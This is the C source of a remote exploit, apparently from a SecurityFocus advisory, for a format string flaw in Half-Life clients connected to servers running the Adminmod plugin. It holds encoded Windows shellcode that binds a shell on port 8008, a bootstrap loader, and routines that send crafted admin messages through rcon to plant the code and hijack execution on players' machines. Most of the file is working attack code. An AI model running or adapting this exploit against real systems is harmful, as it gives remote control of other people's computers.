// source: http://www.securityfocus.com/bid/6582/info

// It has been reported that the Half-Life client contains a format string vulnerability. When receiving messages from an administrator through the adminmod add-on package, the client does not properly handle input. This could result in denial of service, or code execution. 

/*****************************************************************
  * hoagie_adminmod_client.c
  *
  * Remote exploit for Halflife-Clients playing on a server running
  * the Adminmod plugin.
  *
  * Spawns a shell at 8008/tcp.
  *
  * Author: greuff@void.at
  *
  * Credits:
  *    void.at
  *    Taeho Oh for using parts of his shellcode-connection code.
  *    deepzone.org for their shellcode-generator
  *
  * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
  * THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
  * CRIMINAL ACTIVITIES DONE USING THIS PROGRAM.
  *
  *****************************************************************/

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>

char server_ip[20];
char rcon_pwd[30];
int server_port;
char player_nick[30];

#define STRADDR 0x19d4588

/*
-- portable NT/2k/XP ShellCode features ... www.deepzone.org

LoadLibraryA   IT address     004AC2E0h
GetProcAddress IT address     004AC164h
XOR byte                      9Fh
Remote port                   8008
Style                         C

ATTENTION code modified by greuff: 0xff in the first line
changed to 0xfe because the HL-client filters out this
character.

Wrote a short bootstrap loader that changes this byte
again to 0xff. (dec %esp, dec %esp, dec %esp, dec %esp,
pop %esi, incb 0xf(%esi))

It additionally corrects the single '%' in the code that
is filtered out by the format-string-function. (offset 0x65)

Works only when the code gets executed by a ret! (buffer-
address has to lie on the stack)

*/

// total length: 1226 bytes
char *shellcode[] = {
"\x90\x90\x90\x4c\x4c\x4c\x4c\x5e\xfe\x46\x15\xfe\x46\x6b"
"\x68\x5e\x56\xc3\x90\x54\x59\xfe\xd1\x58\x33\xc9\xb1\x1c"
"\x90\x90\x90\x90\x03\xf1\x56\x5f\x33\xc9\x66\xb9\x95\x04"
"\x90\x90\x90\xac\x34\x9f\xaa\xe2\xfa\x77\x9f\x9f\x9f\x9f",

"\xc2\x1e\x72\x46\xbe\xdf\x9f\x12\x2a\x6d\xbb\xdf\x9f\x12"
"\x22\x65\xbb\xdf\x9f\xf5\x98\x0f\x0f\x0f\x0f\xc6\x77\x4d"
"\x9d\x9f\x9f\x12\x2a\xb5\xba\xdf\x9f\x12\x22\xac\xba\xdf"
"\x9f\xf5\x95\x0f\x0f\x0f\x0f\xc6\x77\x24\x9d\x9f\x9f\xf5",

"\x9f\x12\x2a\x46\xba\xdf\x9f\xc9\x12\x2a\x7a\xba\xdf\x9f"
"\xc9\x12\x2a\x76\xba\xdf\x9f\xc9\x60\x0a\xac\xba\xdf\x9f"
"\xf5\x9f\x12\x2a\x46\xba\xdf\x9f\xc9\x12\x2a\x72\xba\xdf"
"\x9f\xc9\x12\x2a\x6e\xba\xdf\x9f\xc9\x60\x0a\xac\xba\xdf",

"\x9f\x58\x1a\x6a\xba\xdf\x9f\xdb\x9f\x9f\x9f\x12\x2a\x6a"
"\xba\xdf\x9f\xc9\x60\x0a\xa8\xba\xdf\x9f\x12\x2a\xb2\xb9"
"\xdf\x9f\x32\xcf\x60\x0a\xcc\xba\xdf\x9f\x12\x2a\xae\xb9"
"\xdf\x9f\x32\xcf\x60\x0a\xcc\xba\xdf\x9f\x12\x2a\x6e\xba",

"\xdf\x9f\x12\x22\xb2\xb9\xdf\x9f\x3a\x12\x2a\x7a\xba\xdf"
"\x9f\x32\x12\x22\xae\xb9\xdf\x9f\x34\x12\x22\xaa\xb9\xdf"
"\x9f\x34\x58\x1a\xba\xb9\xdf\x9f\x9f\x9f\x9f\x9f\x58\x1a"
"\xbe\xb9\xdf\x9f\x9e\x9e\x9f\x9f\x12\x2a\xa6\xb9\xdf\x9f",

"\xc9\x12\x2a\x6a\xba\xdf\x9f\xc9\xf5\x9f\xf5\x9f\xf5\x8f"
"\xf5\x9e\xf5\x9f\xf5\x9f\x12\x2a\xd6\xb9\xdf\x9f\xc9\xf5"
"\x9f\x60\x0a\xa4\xba\xdf\x9f\xf7\x9f\xbf\x9f\x9f\x0f\xf7"
"\x9f\x9d\x9f\x9f\x60\x0a\xdc\xba\xdf\x9f\x16\x1a\xce\xb9",

"\xdf\x9f\xac\x5f\xcf\xdf\xcf\xdf\xcf\x60\x0a\x65\xbb\xdf"
"\x9f\xcf\xc4\xf5\x8f\x12\x2a\x56\xba\xdf\x9f\xc9\xcc\x60"
"\x0a\x61\xbb\xdf\x9f\xf5\x9c\xcc\x60\x0a\x9d\xba\xdf\x9f"
"\x12\x2a\xca\xb9\xdf\x9f\xc9\x12\x2a\x56\xba\xdf\x9f\xc9",

"\xcc\x60\x0a\x99\xba\xdf\x9f\x12\x22\xc6\xb9\xdf\x9f\x34"
"\xac\x5f\xcf\x12\x22\xfa\xb9\xdf\x9f\xc8\xcf\xcf\xcf\x12"
"\x2a\x76\xba\xdf\x9f\x32\xcf\x60\x0a\xa0\xba\xdf\x9f\xf5"
"\xaf\x60\x0a\xd0\xba\xdf\x9f\x74\xd2\x0f\x0f\x0f\xac\x5f",

"\xcf\x12\x22\xfa\xb9\xdf\x9f\xc8\xcf\xcf\xcf\x12\x2a\x76"
"\xba\xdf\x9f\x32\xcf\x60\x0a\xa0\xba\xdf\x9f\xf5\xcf\x60"
"\x0a\xd0\xba\xdf\x9f\x1c\x22\xfa\xb9\xdf\x9f\x9d\x90\x1d"
"\x88\x9e\x9f\x9f\x1e\x22\xfa\xb9\xdf\x9f\x9e\xbf\x9f\x9f",

"\xed\x91\x0f\x0f\x0f\x0f\x58\x1a\xfa\xb9\xdf\x9f\x9f\xbf"
"\x9f\x9f\xf5\x9f\x14\x1a\xfa\xb9\xdf\x9f\x12\x22\xfa\xb9"
"\xdf\x9f\xc8\xcf\x14\x1a\xce\xb9\xdf\x9f\xcf\x12\x2a\x76"
"\xba\xdf\x9f\x32\xcf\x60\x0a\xd8\xba\xdf\x9f\xf5\xcf\x60",

"\x0a\xd0\xba\xdf\x9f\x14\x1a\xfa\xb9\xdf\x9f\xf5\x9f\xcf"
"\x12\x2a\xce\xb9\xdf\x9f\x32\xcf\x12\x2a\xc6\xb9\xdf\x9f"
"\x32\xcf\x60\x0a\x95\xba\xdf\x9f\xf5\x9f\x12\x22\xfa\xb9"
"\xdf\x9f\xc8\xf5\x9f\xf5\x9f\xf5\x9f\x12\x2a\x76\xba\xdf",

"\x9f\x32\xcf\x60\x0a\xa0\xba\xdf\x9f\xf5\xcf\x60\x0a\xd0"
"\xba\xdf\x9f\xac\x56\xa6\x12\xfa\xb9\xdf\x9f\x90\x18\xf8"
"\x60\x60\x60\xf5\x9f\xf7\x9f\xbf\x9f\x9f\x0f\x12\x2a\xce"
"\xb9\xdf\x9f\x32\xcf\x12\x2a\xc6\xb9\xdf\x9f\x32\xcf\x60",

"\x0a\x91\xba\xdf\x9f\x16\x1a\xfe\xb9\xdf\x9f\xf5\x9f\x12"
"\x22\xfa\xb9\xdf\x9f\xc8\xcf\x12\x2a\xce\xb9\xdf\x9f\x32"
"\xcf\x12\x2a\x72\xba\xdf\x9f\x32\xcf\x60\x0a\xd4\xba\xdf"
"\x9f\xf5\xcf\x60\x0a\xd0\xba\xdf\x9f\xf5\x9f\x14\x1a\xfe",

"\xb9\xdf\x9f\x12\x22\xfa\xb9\xdf\x9f\xc8\xcf\x14\x1a\xce"
"\xb9\xdf\x9f\xcf\x12\x2a\x76\xba\xdf\x9f\x32\xcf\x60\x0a"
"\xd8\xba\xdf\x9f\xf5\xcf\x60\x0a\xd0\xba\xdf\x9f\x76\x26"
"\x61\x60\x60\x12\x2a\xc6\xb9\xdf\x9f\x32\xcf\x60\x0a\x8d",

"\xba\xdf\x9f\x12\x2a\xc2\xb9\xdf\x9f\x32\xcf\x60\x0a\x8d"
"\xba\xdf\x9f\xf5\x9f\x60\x0a\xc8\xba\xdf\x9f\xce\xc9\xf7"
"\x7f\x5d\xd5\x9f\x0f\xc5\x60\x8d\xcf\xc4\xc6\xc8\xc1\xce"
"\xc9\xcc\xf7\xfb\x5e\xd5\x9f\x0f\xc5\x60\x8d\xcf\x33\x1b",

"\x5f\xea\x64\xc7\x34\xc6\x7d\x76\x5c\xc8\xcc\xd0\xdc\xd4"
"\xac\xad\x9f\xec\xf0\xfc\xf4\xfa\xeb\x9f\xfd\xf6\xf1\xfb"
"\x9f\xf3\xf6\xec\xeb\xfa\xf1\x9f\xfe\xfc\xfc\xfa\xef\xeb"
"\x9f\xec\xfa\xf1\xfb\x9f\xed\xfa\xfc\xe9\x9f\xfc\xf3\xf0",

"\xec\xfa\xec\xf0\xfc\xf4\xfa\xeb\x9f\xd4\xda\xcd\xd1\xda"
"\xd3\xac\xad\x9f\xdc\xed\xfa\xfe\xeb\xfa\xcf\xf6\xef\xfa"
"\x9f\xd8\xfa\xeb\xcc\xeb\xfe\xed\xeb\xea\xef\xd6\xf1\xf9"
"\xf0\xde\x9f\xdc\xed\xfa\xfe\xeb\xfa\xcf\xed\xf0\xfc\xfa",

"\xec\xec\xde\x9f\xcf\xfa\xfa\xf4\xd1\xfe\xf2\xfa\xfb\xcf"
"\xf6\xef\xfa\x9f\xd8\xf3\xf0\xfd\xfe\xf3\xde\xf3\xf3\xf0"
"\xfc\x9f\xcd\xfa\xfe\xfb\xd9\xf6\xf3\xfa\x9f\xc8\xed\xf6"
"\xeb\xfa\xd9\xf6\xf3\xfa\x9f\xcc\xf3\xfa\xfa\xef\x9f\xdc",

"\xf3\xf0\xec\xfa\xd7\xfe\xf1\xfb\xf3\xfa\x9f\xda\xe7\xf6"
"\xeb\xcf\xed\xf0\xfc\xfa\xec\xec\x9f\xdc\xf0\xfb\xfa\xfb"
"\xbf\xfd\xe6\xbf\xe3\xc5\xfe\xf1\xbf\xa3\xf6\xe5\xfe\xf1"
"\xdf\xfb\xfa\xfa\xef\xe5\xf0\xf1\xfa\xb1\xf0\xed\xf8\xa1",

"\x9d\x9f\x80\xd7\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f"
"\x9f\x9f\x93\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9e\x9f\x9f\x9f"
"\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f"
"\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f",

"\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f"
"\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f"
"\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f"
"\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f",

"\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f"
"\x9f\x9f\xdc\xd2\xdb\xb1\xda\xc7\xda\x9f\x9f\x9f\x9f\x9f"
"\x8f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f\x9f"
"\x9f\x9f\x9f\x9f\x9f\x9f\x96\x96\x96\x96\x96\x90\x90\x90"};  // = 22 blocks

char loader[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x4c\x4c\x4c\x4c\x5a\x31\xc9\xb1\x27\x42\xe2"
"\xfd\x52\x31\xc0\x31\xc9\x66\xbb\x38\x16\x88\xf9\x51\x88"
"\xd9\x40\x8a\x3c\x42\x88\x3a\x42\xe2\xf8\x59\xe2\xf1\xc3";

void create_conn(int *sock, char *host, int port)
{
    struct sockaddr_in sin;
    sin.sin_family=AF_INET;
    sin.sin_port=htons(port);
    if(inet_aton(host,&(sin.sin_addr.s_addr))<0) perror("inet_aton"), exit(1);
    if((*sock=socket(PF_INET,SOCK_DGRAM,0))<0) perror("socket"), exit(1);
}

void lowlevel_rcon(int sock, char *host, int port, char *cmd, char *reply)
{
    char msg[100000];
    struct sockaddr_in sin;
    struct sockaddr_in sfrom;
    fd_set fdset;
    int dummy;

    sin.sin_family=AF_INET;
    sin.sin_port=htons(port);
    if(inet_aton(host,&(sin.sin_addr.s_addr))<0) perror("inet_aton"), exit(1);

    sprintf(msg,"%c%c%c%c%s",0xff,0xff,0xff,0xff,cmd);
    if(sendto(sock,msg,strlen(msg),0,(struct sockaddr *)&sin,sizeof(sin))<0)
       perror("sendto"), exit(1);

    if(reply)
    {
       if(recvfrom(sock,msg,2000,0,(struct sockaddr *)&sfrom,&dummy)<0)
          perror("recvfrom"), exit(1);

       if(strncmp(msg,"\xFF\xFF\xFF\xFF",4))
          fprintf(stderr,"protocol error: reply\n"), exit(1);

       strcpy(reply,msg+4);
    }
}

void send_rcon(int sock, char *host, int port, char *rconpwd, char *cmd, char *reply_fun)
{
    char reply[1000];
    char msg[100000];

    lowlevel_rcon(sock,host,port,"challenge rcon",reply);
    if(!strstr(reply,"challenge rcon "))
       fprintf(stderr,"protocol error\n"), exit(1);
    reply[strlen(reply)-1]=0;

    sprintf(msg,"rcon %s \"%s\" %s",reply+strlen("challenge rcon "),rconpwd,cmd);
    if(reply_fun)
       lowlevel_rcon(sock,host,port,msg,reply);
    else
       lowlevel_rcon(sock,host,port,msg,NULL);
    if(reply_fun)
       strcpy(reply_fun,reply);
}

int main(int argc, char **argv)
{
    int sock, i,j;
    int anzsc;
    char reply[1000], command[100];
    char evil_message[100000];
    unsigned int offset, spaces;
    unsigned long addr;

    printf("hoagie_adminmod_client - remote exploit for half-life-clients\n");
    printf("by greuff@void.at\n\n");
    if(argc<4 || argc>5)
    {
       printf("Usage: %s server_ip server_port rcon_password [player_nick]\n\n",argv[0]);
       exit(1);
    }

    strcpy(server_ip,argv[1]);
    server_port=strtol(argv[2],NULL,10);
    strcpy(rcon_pwd,argv[3]);
    if(argc==5)
    {
       strcpy(player_nick,argv[4]);
       sprintf(command,"admin_command admin_psay \"%s\"",player_nick);
    }
    else
    {
       player_nick[0]=0;
       sprintf(command,"admin_command admin_ssay");
    }

    if(player_nick[0]==0)
    {
       printf("Sending to ALL clients! You have 3 sec to abort...\n");
       sleep(3);
    }

    create_conn(&sock,server_ip,server_port);

    /********* Step 1 - send the complete shellcode and the loader to the big buffer ***********/

    offset=5000+112/2;
    spaces=0;
    for(i=21;i>=0;i--)
    {
       sprintf(evil_message,"%s ",command);
       for(j=0;j<spaces;j++)
          strcat(evil_message," ");
       sprintf(reply,"%%%du%s",offset,shellcode[i]);
       strcat(evil_message,reply);

       printf("Writing shellcode fragment at offset %d...\n",offset);
       send_rcon(sock,server_ip,server_port,rcon_pwd,evil_message,reply);
       offset-=strlen(shellcode[i])+2;   // including \x0a\x00
    }

    /********* Step 2 - send the shellcode bootstrap loader ***********/

    /* correct offset because the shell loader has the double size of a shellcode chunk */
    offset-=strlen(shellcode[0]);
    sprintf(evil_message,"%s ",command);
    for(j=0;j<spaces;j++)
       strcat(evil_message," ");
    sprintf(reply,"%%%du%s",offset,loader);
    strcat(evil_message,reply);

    printf("Writing bootstrap at offset %d...\n",offset);
    send_rcon(sock,server_ip,server_port,rcon_pwd,evil_message,reply);

    /********* Step 3 - construct the code that returns into the shellcode ************/

    addr=STRADDR+offset+73+spaces;
    sprintf(evil_message,"%s AA%c%c%c%c%c%c%%.f%%.f%%.f%%.f%%.f%%.%du%%n",
         command,
         0x68,addr&0xFF,(addr>>8)&0xFF,(addr>>16)&0xFF,(addr>>24)&0xFF,0xc3,734 /* 0x3cd-13 */);
    printf("Writing return into shellcode instructions...\n");
    send_rcon(sock,server_ip,server_port,rcon_pwd,evil_message,reply);

    close(sock);

    printf("Shell (hopefully) spawned at client host port 8008.\n");
    return 0;
}